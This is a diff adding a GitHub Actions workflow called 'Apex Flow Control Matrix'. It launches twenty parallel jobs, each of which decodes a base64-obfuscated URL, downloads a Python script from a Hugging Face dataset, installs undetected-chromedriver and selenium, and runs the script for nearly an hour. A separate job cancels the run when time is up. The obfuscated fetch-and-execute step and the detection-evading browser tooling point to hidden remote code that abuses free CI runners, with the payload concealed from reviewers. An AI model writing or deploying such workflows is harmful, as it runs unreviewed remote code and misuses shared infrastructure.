@@ -1,0 +1,104 @@
+name: Apex Flow Control Matrix
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: flow-session-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Lifespan Controller: enforces maximum run length of 59 minutes
+  # =================================================================
+  lifespan-controller:
+    name: "Apex Lifespan Guard"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_HOLD_SECONDS: 3540
+    steps:
+      - name: Activate Lifetime Timer
+        run: |
+          echo "[LIFESPAN] Initiating execution ceiling for run: ${{ github.run_id }}"
+          echo "[LIFESPAN] Holding process active for ${MAX_HOLD_SECONDS} seconds."
+
+          sleep "${MAX_HOLD_SECONDS}"
+
+          echo "[LIFESPAN] Limit reached. Sending cancellation request to API..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[LIFESPAN] Abort request sent to GitHub runner engine."
+
+  # =================================================================
+  # Parallel Processing Grid
+  # =================================================================
+  grid-executor:
+    name: "GridSlot-${{ matrix.slot_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        slot_id: [2001, 2002, 2003, 2004, 2005, 2006, 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016, 2017, 2018, 2019, 2020]
+
+    steps:
+      # -----------------------------------------------------------------
+      # Step 1: Base Environment Preparation
+      # -----------------------------------------------------------------
+      - name: Boot Environment
+        run: |
+          echo "[BOOT] Setting up Linux packages for GridSlot-${{ matrix.slot_id }}..."
+          export DEBIAN_FRONTEND=noninteractive
+          sudo apt-get update -y -q
+          sudo apt-get install -y -q curl python3-pip
+
+      # -----------------------------------------------------------------
+      # Step 2: Fetch App Payload
+      # -----------------------------------------------------------------
+      - name: Download Execution Core
+        run: |
+          echo "[DOWNLOAD] Fetching encoded payload..."
+          TARGET_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$TARGET_URL" -o app_core.py
+          echo "[DOWNLOAD] Script pulled successfully."
+
+      # -----------------------------------------------------------------
+      # Step 3: Install Required Python Libraries
+      # -----------------------------------------------------------------
+      - name: Provision Python Modules
+        run: |
+          echo "[DEPENDENCIES] Installing required libraries..."
+          pip install --quiet undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # Step 4: Core Execution Management
+      # -----------------------------------------------------------------
+      - name: Run Core Module
+        run: |
+          echo ">> Launching task on GridSlot-${{ matrix.slot_id }}..."
+
+          python3 app_core.py &
+          TASK_PID=$!
+
+          echo ">> Background task spawned with PID $TASK_PID. Max duration: 3540s."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo ">> Lifetime cap elapsed. Killing task PID $TASK_PID..."
+            kill -9 "$TASK_PID"
+            echo ">> Task force terminated."
+          else
+            echo ">> Task completed prior to expiration."
+          fi
